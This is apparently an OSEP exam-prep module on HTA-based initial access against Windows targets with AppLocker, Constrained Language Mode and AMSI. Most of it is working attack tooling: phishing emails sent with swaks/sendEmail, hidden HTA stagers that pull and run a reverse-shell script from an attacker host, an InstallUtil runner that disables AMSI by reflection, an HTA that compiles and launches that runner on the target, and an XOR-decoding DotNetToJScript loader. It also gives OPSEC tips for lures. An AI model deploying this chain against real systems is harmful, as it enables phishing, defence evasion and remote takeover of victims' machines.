::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 02 · HTA entry (first stage when mail has no Office macros)

> **Covers scenarios:** 6, 7, 8
>
> **Prerequisites:** HTTP service on the attacker reachable from the target (Kali `python3 -m http.server` is enough); a Windows environment that can compile .NET Framework (any Win10 on the lab net or your own Windows VM, to produce `m02-clm-bypass-runspace.exe`); mail delivery path (swaks/sendEmail; see scenario 6).

**How the three scenarios relate**: Scenario 6 is “HTA as first stage; target has AppLocker, no Office.” Scenario 7 is “AppLocker + CLM + AMSI all on,” so you must **combine** HTA, an InstallUtil-compatible assembly, a custom Runspace, AMSI handling, and a stage-2 Runner and verify the full chain. Scenario 8 is **timing/lifecycle triage** when “download+execute in one command fails, but split works” — do not blame AV first. All three share the same files; differences are combination and triage order.

---

## Scenario 6: Mail entry exists, but no usable Office macro entry

**Situation**: Target has no Office (macro entry unavailable) but will open a link or `.hta` from mail; AppLocker is on, so directly launching an uploaded EXE is denied. You need an execution chain that does **not** start a standalone EXE.

**Assumptions**: Target can receive mail and click links; user will open HTA (browser opens a URL form, or double-clicks an attachment); AppLocker is in “default rules” shape (allows signed programs under `%SystemRoot%\*` such as `mshta.exe`, `powershell.exe`, `csc.exe`, `InstallUtil.exe`) but **does not allow arbitrary uploaded EXEs to start**. You have: `http://LHOST` reachable by the target (static file server), listen port `LPORT`.

**Prepare (attacker side)**:
1. Stand up static server and listener:
   ```bash
   mkdir -p ~/osep/payloads/web && cd ~/osep/payloads/web
   cp <this-project>/m02-hta-callback.hta ./ok.hta
   cp <this-project>/m02-hta-powershell-stager.hta ./stager.hta
   printf 'ok' > ok.txt          # for callback probe
   python3 -m http.server 80     # or 8080; put the full URL in the mail
   nc -lvnp LPORT                # stage-2 reverse listener
   ```
2. Pre-prepare stage-2 script `shell.ps1` (stable TCP reverse; see cheat sheet `C# for CLM Bypass with PS Script` shell.ps1 template; usable as-is when scenario 6 has no CLM). Replace `[ATTACKER_IP]`/`[PORT]` with `LHOST`/`LPORT` and place it at the web root.
3. Pre-compile **both x86 and x64** InstallUtil-compatible runners (`m02-clm-bypass-runspace.cs`) using scenario 7’s method — this scenario’s fallback.
4. Mail delivery (cheat sheet `HTA` section; URL form beats attachments — attachments are often filtered):
   ```bash
   # Send a "link" lure (recommended): HTA at web root; body only gives http://LHOST/stager.hta
   swaks --body 'Please click here http://LHOST/stager.hta' \
     --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
     --header "Subject: Invoice issue" -t TARGET -f USER@LHOST_DOMAIN \
     --server SMTP_SERVER
   # Attachment form (may be filtered; backup only):
   sendEmail -s SMTP_SERVER -t TARGET -f sender@example.com \
     -u "Subject: issue" -m "see attached" -a ~/osep/payloads/web/stager.hta
   ```

**Procedure**:
1. First prove “HTA fires and JScript runs”: send `ok.hta` to the target (or open `http://LHOST/ok.hta` on a same-class controlled host). It only does one harmless HTTP callback (`/cb?u=<user>@<host>`) and drops no payload. **Seeing both `/ok.hta` and `/cb` in the server log proves mshta→JScript→ActiveX is fully open.**
2. When there is no CLM (confirm with `powershell -ep bypass` as in step 3): use `stager.hta`. mshta runs its JScript; `WScript.Shell.Run` starts `powershell.exe -nop -w hidden -Command "IEX(DownloadString 'http://LHOST/shell.ps1')"`. Watch for:
   - web log `GET /stager.hta`, `GET /shell.ps1`;
   - `nc` listener gets a callback.
3. Decide whether to enter scenario 7’s full chain: in-session run `m00-recon-defenses.ps1`; check `$ExecutionContext.SessionState.LanguageMode` (`ConstrainedLanguage` = CLM), effective AppLocker rules, and whether AMSI is active. **If either CLM or “powershell.exe denied by AppLocker” is true, switch immediately to scenario 7’s combined chain — do not keep trying IEX variants here.**
4. If only “EXE blocked by AppLocker, PowerShell available” (no CLM): still use HTA + PowerShell to download to disk, then load via `InstallUtil.exe /U` (InstallUtil under `%SystemRoot%`, allowed by default rules). Runner: `m02-clm-bypass-runspace.cs`.
5. Bitness table (HTA is hosted by mshta.exe, follows OS bitness): on x64, `C:\Windows\System32\mshta.exe` (64-bit) pulls 64-bit powershell; for an x86 payload use `C:\Windows\SysWOW64\mshta.exe`, or call `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` explicitly in the script.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m02-hta-callback.hta` | Minimal HTA; confirm mshta/JScript/egress | replace `LHOST` |
| `m02-hta-powershell-stager.hta` | HTA→PowerShell IEX pull `shell.ps1` | replace `LHOST` |
| `m02-clm-bypass-runspace.cs` | InstallUtil-compatible runner (build x86 and x64) | replace `LHOST` then compile |
| `m02-hta-embedded-clm-bypass.hta` | Single-file fallback: embedded C#, compile-and-run on target | replace `LHOST` |

#### `m02-hta-callback.hta` {#m02-hta-callback-hta}

````html
<!--
Purpose: Minimal HTA callback — confirm JScript hosted by mshta can run and egress
      (harmless; drops no payload)
Scenario: 6 / 7 / 8 (first validation step for any HTA chain)
Dependencies: target mshta.exe (built-in); attacker HTTP (python3 -m http.server 80)
Usage: replace LHOST with attacker IP, place at web root; target opens
      http://LHOST/m02-hta-callback.hta
      Attacker: log shows GET /m02-hta-callback.hta and GET /cb?u=... = success
Placeholders: LHOST=attacker-reachable IP; callback path fixed at /cb
Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-reviewed
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02cb" APPLICATIONNAME="m02cb"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    // Stage marker: fire once as soon as mshta starts this script
    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false); // false = wait synchronously
            x.send();
        } catch (e) { /* even if egress fails, finish the script so logs can be compared */ }
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // 1) Report identity (user@host) — proves ActiveX works
    var who = sh.ExpandEnvironmentStrings("%USERNAME%") + "@" +
              sh.ExpandEnvironmentStrings("%COMPUTERNAME%");
    beacon("/cb?u=" + encodeURIComponent(who));

    // 2) Harmless egress probe: request ok.txt (any text); do not execute its content
    //    sh.Run("powershell.exe -nop -w hidden -Command \"(New-Object Net.WebClient).DownloadString('http://LHOST/ok.txt')\"", 0, true);

    // Note: only after all three echoes (hta-start / u= / optional ok.txt GET) appear
    // should you swap the entry to a real stager; if any is missing, fix that link first —
    // do not jump straight to a payload.
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

#### `m02-hta-powershell-stager.hta` {#m02-hta-powershell-stager-hta}

````html
<!--
Purpose: HTA→PowerShell pull-and-run stage 2 (shell.ps1); scenario 6 main entry;
      scenario 8 "merged shape" control
Scenario: 6 (no Office, no CLM); 8 (control: IEX download content in one command)
Dependencies: target mshta.exe + powershell.exe (AppLocker default rules allow System32);
      attacker HTTP and listener
Usage: replace LHOST/LPORT, place at web root; put shell.ps1 (TCP reverse) on the same
      server; target opens http://LHOST/m02-hta-powershell-stager.hta or
      mshta.exe http://LHOST/xxx.hta
Placeholders: LHOST=attacker IP; LPORT=reverse listen port (used inside shell.ps1);
      URL=stage-2 script address
Test status: Not Windows-lab tested (this host is macOS); quote-nesting rules in comments
      below — retest after edits
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02st" APPLICATIONNAME="m02st"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    // Echo point: helps confirm mshta actually reached here
    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false);
            x.send();
        } catch (e) {}
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // Stage-2 script URL: use the URL placeholder; replace before use
    // For a single "download and execute" PowerShell command, use:
    //   IEX((New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1'))
    // If the target egresses via proxy, set the proxy inside the command before IEX
    // (see M09 scenario 28).
    var url = "http://LHOST/shell.ps1";

    // Quote rules (most common HTA breakpoint):
    // Outer Run(...) wraps the whole command line in single quotes; parameters
    // inside use double quotes; strings inside PowerShell use single quotes, so
    // you need \' escapes (demonstrated on this line).
    // If edits break, safest path: Base64-encode the whole PowerShell block and
    // pass with -enc so the command string has only one quote layer
    // (see header examples in m02-hta-download-exec-split.hta).
    var cmd = "powershell.exe -nop -w hidden -Command " +
              "\"IEX((New-Object Net.WebClient).DownloadString('" + url + "'))\"";

    // 0=hidden window, true=wait for process exit before returning
    var rc = sh.Run(cmd, 0, true);
    if (rc !== 0) { beacon("/cb?stage=iex-fail&rc=" + rc); }
    else          { beacon("/cb?stage=iex-done"); }
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

#### `m02-clm-bypass-runspace.cs` {#m02-clm-bypass-runspace-cs}

````csharp
// Purpose: InstallUtil-compatible runner — InstallUtil.exe /U triggers Uninstall(),
//       which in a custom Runspace (FullLanguage) does AMSI handling then IEX-
//       downloads stage-2 shell.ps1 (bypass AppLocker EXE direct-launch limits + CLM)
// Scenario: 6 (EXE denied by AppLocker, PowerShell available — fallback) /
//       7 (AppLocker+CLM+AMSI combined-chain core)
// Dependencies: Windows + .NET Framework 4 + System.Management.Automation (GAC,
//       ships with PowerShell); compile with csc
// Usage: compile on a Windows build host (x64 and x86 each):
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:m02stage64.exe ^
//     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
//   (32-bit uses Framework\v4.0.30319; if /r by simple name fails, give the full
//    GAC path: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\...)
//   Place artifact at Kali web root; on the target:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <exe>
//   Note: InstallUtil only runs Uninstall(); Main() is never executed
// Placeholders: LHOST=attacker IP (replace DEFAULT_URL below); LPORT is inside
//       shell.ps1; env var M02_URL can override the URL
// Test status: Not lab-tested (this host is macOS, no csc); compile on Windows
//       and verify the full chain on the lab net
using System;
using System.Collections;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace M02
{
    class Program
    {
        static void Main(string[] args)
        {
            // When run directly, only print usage; real entry is Installer.Uninstall below (InstallUtil /U)
            Console.WriteLine("m02-clm-bypass-runspace: run via InstallUtil.exe /U <this.exe>");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Stage : System.Configuration.Install.Installer
    {
        private const string DEFAULT_URL = "http://LHOST/shell.ps1";

        public override void Uninstall(IDictionary savedState)
        {
            // Allow env override of URL so you need not recompile to change address:
            //   target: set M02_URL=http://LHOST/shell.ps1 && InstallUtil.exe /U ...
            string url = Environment.GetEnvironmentVariable("M02_URL");
            if (string.IsNullOrEmpty(url)) { url = DEFAULT_URL; }

            // Key point: CLM is a language-mode limit inside the powershell.exe process engine;
            // this process is InstallUtil — a self-built Runspace starts in FullLanguage.
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                // 1) AMSI handling: AMSI is attached to the System.Management.Automation
                //    engine regardless of who created the process, so set amsiInitFailed
                //    in the same engine before running downloaded content (FullLanguage
                //    allows reflection).
                // 2) Download and run stage 2 (shell.ps1 has TCP reverse; replace LHOST/LPORT first).
                string script =
                    "$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" +
                    ".GetField('amsiInitFailed','NonPublic,Static');" +
                    "if($f){$f.SetValue($null,$true)};" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + url + "'));";

                ps.AddScript(script);
                try { ps.Invoke(); }
                catch (Exception ex)
                {
                    // Fail with readable output: InstallUtil /LogToConsole=false does not log to disk; errors go to stderr
                    Console.Error.WriteLine("[m02] runspace invoke failed: " + ex.Message);
                }
                rs.Close();
            }
        }
    }
}
````

#### `m02-hta-embedded-clm-bypass.hta` {#m02-hta-embedded-clm-bypass-hta}

````html
<!--
Purpose: Single-file full combined-chain HTA: mshta→(write C# source)→csc compile
      now→InstallUtil /U→custom Runspace→AMSI handling→IEX shell.ps1
Scenario: 7 (main path when AppLocker + CLM + AMSI are all on; no pre-built artifact required)
Dependencies: target mshta.exe / csc.exe / InstallUtil.exe (all under SystemRoot;
      AppLocker default rules allow)
Usage: replace LHOST in two places (JS constant cbHost and the shell.ps1 URL inside
      embedded C#), place at web root; target opens
      http://LHOST/m02-hta-embedded-clm-bypass.hta
Placeholders: LHOST=attacker IP; shell.ps1=stage-2 reverse at web root (replace
      LHOST/LPORT yourself first)
Test status: Not Windows-lab tested (this host is macOS); full lab-net verification
      required (scenario 7 demands combined validation)
Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync when editing
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02clm" APPLICATIONNAME="m02clm"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    var cbHost = "http://LHOST";   // for echoes
    var psURL  = "http://LHOST/shell.ps1"; // stage 2 downloaded inside the runner

    function beacon(p) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", cbHost + p, false);
            x.send();
        } catch (e) {}
    }
    function fso() { return new ActiveXObject("Scripting.FileSystemObject"); }

    // Pick a writable dir: prefer C:\Windows\Tasks (AppLocker checks direct EXE launch,
    // not assemblies loaded by InstallUtil); fall back to %TEMP%
    function pickDir() {
        var sh = new ActiveXObject("WScript.Shell");
        var d = "C:\\Windows\\Tasks";
        try { fso().CreateFolder(d); } catch (e) {}
        try {
            var t = d + "\\.wtest";
            var f = fso().CreateTextFile(t, true); f.Close(); fso().DeleteFile(t);
            return d;
        } catch (e) { return sh.ExpandEnvironmentStrings("%TEMP%"); }
    }

    // Locate .NET Framework dir (by process bitness) and System.Management.Automation.dll in the GAC
    function fxDir() {
        var sh = new ActiveXObject("WScript.Shell");
        var arch = sh.Environment("PROCESS")("PROCESSOR_ARCHITECTURE");
        var pre = (arch === "x86") ? "Framework" : "Framework64";
        var d = "C:\\Windows\\Microsoft.NET\\" + pre + "\\v4.0.30319";
        if (!fso().FolderExists(d)) { d = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"; }
        return d;
    }
    function gacSmaDll() {
        var base = "C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\";
        if (!fso().FolderExists(base)) { return ""; }
        var e = new Enumerator(fso().GetFolder(base).SubFolders);
        for (; !e.atEnd(); e.moveNext()) {
            var p = base + e.item().Name + "\\System.Management.Automation.dll";
            if (fso().FileExists(p)) { return p; }
        }
        return "";
    }

    beacon("/cb?stage=hta-start");

    // ---- Embedded C# source (equivalent to m02-clm-bypass-runspace.cs, trimmed to embed) ----
    // Convention: each line is a JS double-quoted string; source itself avoids double
    // quotes and backslashes to prevent escape bugs.
    // To change URL: editing psURL also affects the line that concatenates it into C#.
    var csLines = [
        "using System;",
        "using System.Collections;",
        "using System.Management.Automation;",
        "using System.Management.Automation.Runspaces;",
        "using System.Configuration.Install;",
        "namespace M02 {",
        "  [System.ComponentModel.RunInstaller(true)]",
        "  public class S : System.Configuration.Install.Installer {",
        "    public override void Uninstall(IDictionary saved) {",
        "      string u = '" + psURL + "';",
        "      using (Runspace rs = RunspaceFactory.CreateRunspace()) {",
        "        rs.Open();",
        "        PowerShell ps = PowerShell.Create();",
        "        ps.Runspace = rs;",
        "        string sc = \"$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static');if($f){$f.SetValue($null,$true)};IEX((New-Object Net.WebClient).DownloadString(u));\";",
        "        ps.AddScript(sc);",
        "        ps.Invoke();",
        "        rs.Close();",
        "      }",
        "    }",
        "  }",
        "}"
    ];

    var dir = pickDir();
    var csPath = dir + "\\m02stage.cs";
    var exePath = dir + "\\m02stage.exe";
    try {
        var w = fso().CreateTextFile(csPath, true);
        for (var i = 0; i < csLines.length; i++) { w.WriteLine(csLines[i]); }
        w.Close();
        beacon("/cb?stage=cs-written&dir=" + dir);
    } catch (e) { beacon("/cb?stage=cs-write-fail"); }

    var fx = fxDir();
    var sma = gacSmaDll();
    var csc = fx + "\\csc.exe";
    // Without a GAC path, fall back to simple-name references (works in some envs) and leave a log trail
    var refs = (sma !== "") ? "/r:\"" + sma + "\" /r:\"" + fx + "\\System.Configuration.Install.dll\""
                            : "/r:System.Management.Automation.dll /r:System.Configuration.Install.dll";
    var cc = csc + " /nologo /out:\"" + exePath + "\" " + refs + " \"" + csPath + "\"";

    var sh = new ActiveXObject("WScript.Shell");
    var rc1 = sh.Run(cc, 0, true);
    if (rc1 !== 0) { beacon("/cb?stage=compile-fail&rc=" + rc1); }
    else if (!fso().FileExists(exePath)) { beacon("/cb?stage=compile-fail&reason=no-exe"); }
    else {
        beacon("/cb?stage=compile-ok");
        var iu = fx + "\\InstallUtil.exe";
        // /U triggers Installer.Uninstall() above: custom Runspace(FullLanguage) → AMSI handling → IEX(psURL)
        var cmd = iu + " /logfile= /LogToConsole=false /U \"" + exePath + "\"";
        var rc2 = sh.Run(cmd, 0, true);
        if (rc2 !== 0) { beacon("/cb?stage=installutil-fail&rc=" + rc2); }
        else           { beacon("/cb?stage=installutil-done"); }
    }
    // Conclusion: compile-fail = csc reference/path issue; installutil-done with no callback =
    // runner bitness or shell.ps1 blocked by AMSI.
    // Bitness: this HTA picks Framework/Framework64 from mshta bitness; on 64-bit targets
    // default mshta is 64-bit.
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

**Validation**: web log shows `GET /xxx.hta` → `GET /shell.ps1` (or `/cb`) in order, then `nc -lvnp LPORT` gets a callback; `whoami` is the target user. If any link is missing, locate it with scenario 8’s “echo each stage” approach.

**Failure branches and alternatives**:
- If `mshta.exe` is denied by AppLocker (policy tightened even for System32) → switch to `cscript/wscript` JScript (see M03 scenarios 9–10), or another signed host allowed by default.
- If `.hta` attachments are filtered by the mail gateway → send only a link with HTA at the web root; or lure with a shortcut that runs `C:\Windows\System32\mshta.exe http://LHOST/stager.hta`.
- If `DownloadString` is blocked (AMSI/Defender scanning IEX content) → run `Disable AMSI` first (same cheat sheet section) then IEX, or jump straight to scenario 7’s combined chain.
- If egress is proxy-only → in shell.ps1 set `[System.Net.WebRequest]::DefaultWebProxy` explicitly (see M09 scenario 28).

**Exam / OPSEC notes**: HTA flashes a desktop window — use `<HTA:APPLICATION ... WINDOWSTATE="minimize">` and `self.close()` at the end so it does not sit in front of the user; keep real attacker domains out of the mail body and use business-looking lures; run the harmless callback before any payload so you do not burn a whole mail round on a dead entry.

---

## Scenario 7: HTA can fire, but the target has AppLocker, CLM, and AMSI together

**Situation**: HTA runs, but ordinary EXEs are limited by application control; PowerShell is in Constrained Language Mode (CLM: `Add-Type`, reflection, dynamic compile unavailable); script content is also AMSI-scanned. **Passing each component alone ≠ the chain works** — you must validate the full combination.

**Assumptions**: AppLocker default rules allow signed System32 programs: `mshta.exe`, `powershell.exe` (but enters CLM), `csc.exe`, `InstallUtil.exe`; script files (`.ps1`) are limited by script rules/language mode so you cannot just `powershell -File`. Custom Runspace is the key: a non-powershell.exe process (the .NET program hosted by InstallUtil) creates `System.Management.Automation.Runspaces`; that engine runs in FullLanguage and is not bound by AppLocker script rules.

**Prepare (attacker side)**:
1. Improved `shell.ps1`: in the cheat sheet reverse template (`C# for CLM Bypass with PS Script` section) **insert AMSI handling on the first line** (`amsiInitFailed` reflection works under FullLanguage), then the reverse code; replace `LHOST/LPORT`. Host at the web root.
2. On a Windows build host produce runners (x64 and x86 each):
   ```bat
   :: x64 (preferred on 64-bit targets)
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo ^
     /out:%USERPROFILE%\m02stage64.exe ^
     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
     m02-clm-bypass-runspace.cs
   :: x86 (backup)
   C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo ^
     /out:%USERPROFILE%\m02stage32.exe ^
     /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
     m02-clm-bypass-runspace.cs
   ```
   If `/r:System.Management.Automation.dll` fails to resolve, reference the full GAC path: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<ver>__31bf3856ad364e35\System.Management.Automation.dll`. Also add a `System.Configuration.Install` reference (cheat sheet notes VS often misses it).
3. Optional: `certutil -encode m02stage64.exe enc.txt` so the runner can travel as text through mail/download (decode on target with `certutil -decode`; see cheat sheet steps).
4. Place exe/enc.txt and shell.ps1 at the Kali web root; start `python3 -m http.server` and `nc -lvnp LPORT`.

**Procedure**:
1. Recon that all three are present (`m00-recon-defenses.ps1`): effective AppLocker rules, language mode `ConstrainedLanguage`, whether `amsi.dll` is in the process (cheat sheet `Enumerate Defenses` / `Disable AMSI`). Only then is this chain worth running.
2. First run `m02-hta-callback.hta` to confirm the mshta host itself is not blocked by policy/AV by process name (callback `GET /cb` is enough).
3. Use `m02-hta-embedded-clm-bypass.hta` (single file: embedded C# + on-target csc + InstallUtil /U) or manually run the equivalent “download→decode→InstallUtil” chain:
   ```
   mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta
   ```
   In-chain logic (each step has an HTTP echo for locating breaks):
   1. Write `m02stage.cs` to `C:\Windows\Tasks\` (user-writable; or `%TEMP%`);
   2. Call `csc.exe` to build `m02stage.exe` (Framework64/Framework by process bitness);
   3. `InstallUtil.exe /logfile= /LogToConsole=false /U <exe>` → triggers `Installer.Uninstall()`;
   4. Inside Uninstall: new custom Runspace → AMSI handling in that engine → `IEX(DownloadString 'http://LHOST/shell.ps1')`;
   5. shell.ps1 reverses to `LHOST:LPORT`.
4. **Why this clears all three gates** (memorize; exam may ask you to explain):
   - AppLocker: mshta/csc/InstallUtil are signed System32 programs → direct launch allowed; the runner exe is “an assembly loaded by InstallUtil,” not a process AppLocker launches → EXE rules do not apply;
   - CLM: Constrained Language Mode only applies to the engine inside powershell.exe; a self-built Runspace inside InstallUtil is FullLanguage — `Add-Type`/reflection/`IEX` all work;
   - AMSI: AMSI attaches to the System.Management.Automation engine (whoever created it), so in the **same custom Runspace run `amsiInitFailed` reflection first**, then IEX the download.
5. Alternate trigger for the same runner: `InstallUtil.exe /logfile= /LogToConsole=false /U` can also be called from PowerShell (even under CLM if allowed commands remain) or an existing session — the runner need not go through mshta. If InstallUtil itself is denied by policy → DotNetToJScript variant: compile `m02-clm-bypass-dotnettojscript.cs` as a library, serialize to `.js` with DotNetToJScript, embed in HTA (JScript load in M03) — no EXE and no InstallUtil.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m02-hta-embedded-clm-bypass.hta` | Single-file full chain: mshta→csc→InstallUtil→Runspace→IEX | replace `LHOST` |
| `m02-clm-bypass-runspace.cs` | InstallUtil-compatible runner (custom Runspace + AMSI handling) | replace `LHOST`, compile x86/x64 |
| `m02-clm-bypass-dotnettojscript.cs` | No-EXE alternate: DotNetToJScript payload class | compile as library; serialize with M03 tools |
| `m02-hta-download-exec-split.hta` | When the chain fails, switch to “split two stages” triage | replace `LHOST` |

#### `m02-clm-bypass-dotnettojscript.cs` {#m02-clm-bypass-dotnettojscript-cs}

````csharp
// Purpose: C# payload skeleton for the DotNetToJScript path (CLM-bypass edition) —
//       JScript only loads; heavy work stays on the managed side
// Scenario: 7, 10 (HTA/JScript entry + CLM + AMSI combined)
// Dependencies: .NET Framework 4.x; csc.exe compile as Library
// Usage:
//   csc.exe /target:library /out:clm.dll m02-clm-bypass-dotnettojscript.cs
//   then convert with DotNetToJScript to .js, or host via m02-hta-embedded-clm-bypass.hta
// Placeholders: LHOST/LPORT, STAGE2_URL, XOR_KEY
// Test status: Not compile-verified (no csc on this host); syntax hand-checked
//
// Notes (scenario 7 full chain):
//   HTA(mshta) → JScript/COM instantiates this class → new Runspace(FullLanguage) → load stage 2
//   This class only "restores language capability under CLM"; concrete payload stays in
//   stage 2 so it can be swapped independently.

using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Payload
{
    [ComVisible(true)]
    public class ClmRunner
    {
        private const string STAGE2_URL = "http://LHOST/stage2.b64";  // ← replace
        private const byte XOR_KEY = 0x2A;

        public ClmRunner() { }

        public void Run()
        {
            try
            {
                byte[] enc = new WebClient().DownloadData(STAGE2_URL);
                for (int i = 0; i < enc.Length; i++) enc[i] ^= XOR_KEY;

                Assembly asm = Assembly.Load(enc);
                foreach (Type t in asm.GetTypes())
                {
                    if (!t.IsPublic) continue;
                    MethodInfo m = t.GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
                    if (m != null) { m.Invoke(null, null); return; }
                }
            }
            catch (Exception ex)
            {
                // Do not fail silently: distinguish "download failed" vs "load/AMSI failed"
                Console.Error.WriteLine("[!] CLM runner failed: " + ex.Message);
            }
        }
    }
}
````

#### `m02-hta-download-exec-split.hta` {#m02-hta-download-exec-split-hta}

````html
<!--
Purpose: Two-stage HTA with download and execute separated: stage 1 drops and
      checks the file exists; stage 2 only then executes; each stage has HTTP echoes
Scenario: 8 (main tool for "merged fails, split works" timing/lifecycle triage);
      also a stable landing shape for scenarios 6/7
Dependencies: target mshta.exe + powershell.exe (or certutil/bitsadmin downloaders
      as needed); attacker HTTP
Usage: replace LHOST, URL, OUT; place at web root; target opens
      http://LHOST/m02-hta-download-exec-split.hta
      Attacker watches the log: hta-start -> download-done/fail -> exec-done/fail
Placeholders: LHOST=attacker IP; URL=stage-2 file to download; OUT=drop path on
      target (default C:\Windows\Tasks)
Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-reviewed
-->
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION ID="m02split" APPLICATIONNAME="m02split"
  SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
    var URL = "http://LHOST/shell.ps1";      // download source (stage-2 script)
    var OUT = "C:\\Windows\\Tasks\\stage2.ps1"; // drop path (Tasks is user-writable; or %TEMP%)
    var EXE = "";                            // if downloading an EXE for another exec path, put downloader args here

    function beacon(path) {
        try {
            var x = new ActiveXObject("MSXML2.XMLHTTP");
            x.open("GET", "http://LHOST" + path, false);
            x.send();
        } catch (e) {}
    }
    function fileExists(p) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            return fso.FileExists(p);
        } catch (e) { return false; }
    }
    function fileSize(p) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            return fso.GetFile(p).Size;
        } catch (e) { return -1; }
    }
    beacon("/cb?stage=hta-start");

    var sh = new ActiveXObject("WScript.Shell");

    // ---- Stage 1: download only, wait for it to finish ----
    // PowerShell version (default). If blocked, replace cmd below with:
    //   certutil.exe -urlcache -split -f URL OUT
    //   bitsadmin.exe /transfer m02 /download /priority normal URL OUT
    // Same quote rules: outer single quotes, parameter double quotes, PS string
    // single quotes escaped; if escaping is painful, use the certutil one-liner
    // (no inner quotes).
    var dl = "powershell.exe -nop -w hidden -Command " +
             "\"(New-Object Net.WebClient).DownloadFile('" + URL + "','" + OUT + "')\"";
    var rc1 = sh.Run(dl, 0, true);

    // Leave a window for realtime scanners/AV: file just written may still be
    // under scan; executing immediately often fails
    WScript.Sleep(3000);

    if (rc1 !== 0) {
        beacon("/cb?stage=download-fail&rc=" + rc1);
    } else if (!fileExists(OUT)) {
        beacon("/cb?stage=download-fail&reason=no-file");
    } else {
        beacon("/cb?stage=download-done&size=" + fileSize(OUT));
        // ---- Stage 2: only after the file is confirmed, execute separately ----
        // Choose exec by dropped file type:
        //  .ps1 -> powershell -File (needs no CLM/script-rule limits; if limited,
        //         switch to InstallUtil/Runspace)
        //  .exe -> Run directly or InstallUtil.exe /U (AppLocker case; see
        //         m02-hta-embedded-clm-bypass.hta)
        var ex = "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -File " + "\"" + OUT + "\"";
        var rc2 = sh.Run(ex, 0, true);
        if (rc2 !== 0) { beacon("/cb?stage=exec-fail&rc=" + rc2); }
        else           { beacon("/cb?stage=exec-done"); }
    }
    // Log conclusions: download-fail = download link issue (quotes/proxy/URL);
    //               download-done + exec-fail = exec path limited — switch to
    //               scenario 7 combined chain;
    //               both stages done but no callback = shell.ps1 content/listener
    //               (AMSI → scenario 7).
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
````

**Validation**: the chain has 4–5 HTTP echo points (`hta-start` / `cs-written` / `compile-ok` / `installutil-called` / final nc callback). On the exam, locate by which echo stops: stop before compile = write/csc blocked; stop after InstallUtil with no callback = runner bitness wrong or shell.ps1 blocked by AMSI/AV. Finish with `whoami` + `ipconfig /all` for identity and segment.

**Failure branches and alternatives**:
- If x64 runner has no callback but x86 does (or vice versa) → bitness mismatch; swap the other build; confirm actual mshta/InstallUtil bitness (Framework64 is 64-bit).
- If InstallUtil itself is removed by AppLocker/policy → DotNetToJScript variant (no InstallUtil, no EXE).
- If the AMSI-handling line itself is blocked (`AmsiUtils` string is a signature) → switch to other reflection styles from the `Disable AMSI` section or string-split concatenation; keep host-process bitness matched.
- If on the real target “each link works alone, chained together does nothing” → triage timing per scenario 8; do not assume AV.

**Exam / OPSEC notes**: the three-piece combined chain **must be walked end-to-end on the lab net** before the exam — order, bitness, missing references, InstallUtil paths that were never verified are time sinks; keep x64/x86 copies of runner and shell.ps1 and pick by measured target; avoid large Meterpreter payloads — simple TCP reverse + AMSI handling is most stable (cheat sheet notes some samples fail with AMSI on); HTA still flashes briefly — minimize + immediate `self.close()`.

---

